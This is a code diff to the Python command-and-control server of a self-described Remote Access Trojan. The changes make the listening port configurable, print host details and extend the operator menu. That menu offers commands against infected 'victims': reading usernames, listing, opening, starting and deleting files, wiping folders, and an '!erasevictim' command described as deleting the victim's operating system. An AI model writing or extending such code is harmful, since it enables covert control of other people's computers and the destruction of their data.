@@ -1,7 +1,8 @@
 import socket, os, threading
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ip = socket.gethostbyname(socket.gethostname())
-s.bind((ip, 80))
+port = 80
+s.bind((ip, port))
 connections = []
 def connect():
     while True:
@@ -30,6 +31,10 @@ def instruct():
     print("")
     print("This is a server for controlling Computers infected by the client-side Remote Access Trojan.")
     print("")
+    print(f"[+] Server Hosted On Device: {socket.gethostname()}")
+    print(f"[+] Server Hosted On IP: {ip}, {socket.gethostbyname(socket.gethostname())}")
+    print(f"[+] Server Hosted On Port: {port}")
+    print("")
     print("[+] Commands List:")
     print("")
     print("[+] !getusername - Gets the Username of the computers")
@@ -39,9 +44,10 @@ def instruct():
     print("[+] !listdir - Lists all the files in the Victims working directory")
     print("[+] !erasevictim - Delete the OS of the victims computer")
     print("[+] !delfile <file> - Deletes a file in the directory")
-    print("[+] !wipefolder - Wipes all of the files in the current directory(changing it is suggested)")
+    print("[+] !wipefolder <folder> - Wipes all of the files in the current directory(changing it is suggested)")
     print("[+] !openfile <filename> - Opens a File in Text editor mode(only 1 word filenames)")
     print("[+] !startfile <filename> - Starts a file(only one word filenames)")
+    print("[+] !delfile <filename> - Deletes a file in the working directory(only 1 word filenames)")
     while True:
         try:
             instruction = input("\n[+] Enter an Instruction: ")
